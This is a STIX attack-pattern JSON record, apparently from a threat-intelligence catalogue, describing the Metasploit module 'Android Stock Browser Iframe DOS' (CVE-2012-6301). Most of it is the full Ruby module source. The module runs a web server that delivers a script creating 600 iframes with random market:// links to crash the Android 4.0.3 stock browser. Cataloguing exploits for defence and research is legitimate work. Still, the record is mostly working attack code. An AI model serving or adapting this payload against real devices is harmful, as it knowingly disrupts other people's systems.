{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1fb8f666-e0f7-4928-b9a6-3ce25f6f10ce",
    "created": "2024-08-14T16:25:04.465085Z",
    "modified": "2024-08-14T16:25:04.465089Z",
    "name": "\"Android Stock Browser Iframe DOS\"",
    "description": "( This module exploits a vulnerability in the native browser that comes with Android 4.0.3. If successful, the browser will crash after viewing the webpage. ) 'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/android/android_stock_browser_iframe.rb",
            "external_id": "android_stock_browser_iframe.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-6301"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpServer\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'           => \"Android Stock Browser Iframe DOS\",\n        'Description'    => %q(\n          This module exploits a vulnerability in the native browser that comes with Android 4.0.3.\n          If successful, the browser will crash after viewing the webpage.\n        ),\n        'License'        => MSF_LICENSE,\n        'Author'         => [\n          'Jean Pascal Pereira',  # Original exploit discovery\n          'Jonathan Waggoner'     # Metasploit module\n        ],\n        'References'     => [\n          [ 'PACKETSTORM', '118539'],\n          [ 'CVE', '2012-6301' ]\n        ],\n        'DisclosureDate' => '2012-12-01',\n        'Actions'        => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],\n        'PassiveActions' => [ 'WebServer' ],\n        'DefaultAction'  => 'WebServer'\n      )\n    )\n  end\n\n  def run\n    exploit # start http server\n  end\n\n  def setup\n    @html = %|\n    <html>\n    <body>\n    <script type=\"text/javascript\">\n      for (var i = 0; i < 600; i++)\n      {\n        var m_frame = document.createElement(\"iframe\");\n        m_frame.setAttribute(\"src\", \"market://#{Rex::Text.rand_text_alpha(rand(16) + 1)}\");\n        document.body.appendChild(m_frame);\n      }\n    </script>\n    </body>\n    </html>\n    |\n  end\n\n  def on_request_uri(cli, _request)\n    print_status('Sending response')\n    send_response(cli, @html)\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-12-01"
}